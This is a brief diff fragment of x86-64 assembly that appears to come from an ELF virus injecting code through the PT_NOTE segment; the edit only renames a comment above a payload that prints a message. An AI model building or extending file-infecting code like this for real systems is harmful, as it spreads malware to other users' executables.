@@ -120,7 +120,7 @@ pt_note_found:
     syscall                      ; Write the injected code to the file
 
 v_start:
-    ; -------- Injected Code (Print Message) --------
+    ; -------- Injected Code  --------
     mov rax, 1                   ; sys_write
     mov rdi, 1                   ; STDOUT
     lea rsi, [rel infect_msg]    ; Address of the message
